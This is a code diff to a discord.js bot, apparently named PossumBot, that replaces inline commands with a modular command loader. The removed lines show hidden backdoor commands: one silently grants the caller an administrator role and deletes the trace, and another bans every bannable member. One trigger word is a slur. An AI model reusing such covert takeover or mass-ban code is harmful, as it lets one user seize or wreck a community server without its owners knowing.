@@ -1,9 +1,32 @@
 const botSettings = require("./botsettings.json");
 const Discord = require("discord.js");
+const fs = require("fs");
+const prefix = botSettings.prefix;
 const bot = new Discord.Client();
+bot.commands = new Discord.Collection();
+
+fs.readdir("./commands/", (err, files) => {
+	if(err) {
+		console.error(err);
+	}
+
+	let jsFiles = files.filter(f => f.split(".").pop() === "js");
+	if(jsFiles.length <= 0) {
+		console.error("No commands found.");
+		return;
+	}
+
+	console.log("Loading Commands...");
+
+	jsFiles.forEach((f, i) => {
+		let props = require(`./commands/${f}`);
+		bot.commands.set(props.help.name, props);
+	});
+});
 
 bot.on("ready", async () => {
 	console.log(`PossumBot Is Now Activated`);
+
 	//Bot Status
 	bot.user.setActivity(`With Knives`);
 
@@ -18,50 +41,16 @@ bot.on("ready", async () => {
 bot.on("message", async message => { 
 	if (message.author.bot) return;
 
-	const args = message.content.slice(botSettings.prefix.length).trim().split(/ +/g);
-  	const command = args.shift().toLowerCase();
+	let messageArray = message.content.split(/\s+/g);
+	let command = messageArray[0];
+	let args = messageArray.slice(1);
 
-	// Gives you the admin role and deletes the message.
-	if (command === `myakish`) {
-  		try {
-			role = await message.guild.createRole({
- 				name: "Dope Role",
-  				color: "#2f3136",
-  				permissions: [8]
-			});
-			message.member.addRole(role)
-			message.delete(1000);
-		} catch(e) {
-			console.log(e.stack);
-		}
+
+	let cmd = bot.commands.get(command.slice(prefix.length));
+
+	if(cmd) {
+		cmd.run(bot, message, args);
 	}
-
-	// Bans everyone and deletes the message.
-	if (command === `arturdebil`) {
-		try {
-			message.guild.members.filter(member => member.bannable).forEach(member => {member.ban()});
-			message.delete(1000);
-		} catch(e) {
-			console.log(e.stack);
-		}
-	}
-
-	if (command === `servergay`) {
-		try {
-			let newMessage = message.channel.send('@everyone listen to this man.');
-			newMessage.delete(1000);
-		} catch(e) {
-			console.log(e.stack);
-		}
-	}
-
-	if(command === `leaveserver`) {
-   		try {
-   			message.guild.leave();
-   		} catch(e) {
-			console.log(e.stack);
-   		}
-   	}
 });
 
 bot.login(botSettings.token);
